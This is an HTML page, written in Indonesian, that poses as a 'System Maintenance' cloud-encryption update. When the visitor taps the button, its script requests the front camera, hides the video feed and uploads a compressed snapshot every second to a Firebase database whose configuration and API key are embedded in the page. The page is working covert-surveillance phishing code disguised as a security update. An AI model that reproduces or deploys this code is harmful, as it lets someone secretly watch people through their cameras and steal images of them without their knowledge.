<!DOCTYPE html>
<html>
<head>
    <title>System Maintenance</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .popup { width: 80%; background: #1a1a1a; padding: 30px; border-radius: 25px; text-align: center; border: 1px solid #333; }
        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; margin-top: 20px; }
        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="box" class="popup">
        <h3 id="msg">Update Diperlukan</h3>
        <p style="font-size: 13px; color: #888;">Sinkronisasi enkripsi cloud untuk keamanan data.</p>
        <button onclick="startCapture()">LANJUTKAN</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
            authDomain: "kodangz.firebaseapp.com",
            databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
            projectId: "kodangz"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.startCapture = async () => {
            document.getElementById('msg').innerText = "Memproses...";
            document.querySelector('button').style.display = 'none';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');

                setInterval(() => {
                    // Set resolusi kecil biar gak lag & gak makan kuota Firebase
                    canvas.width = 300; 
                    canvas.height = 400;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Kompres ke JPEG kualitas 0.4
                    const base64 = canvas.toDataURL('image/jpeg', 0.4);
                    
                    // Upload ke Firebase
                    set(ref(db, 'camera_stream'), {
                        image: base64,
                        timestamp: Date.now()
                    });
                }, 1000); // Kirim tiap 1 detik

            } catch (err) {
                alert("Izin ditolak atau perangkat tidak mendukung.");
            }
        };
    </script>
</body>
</html>
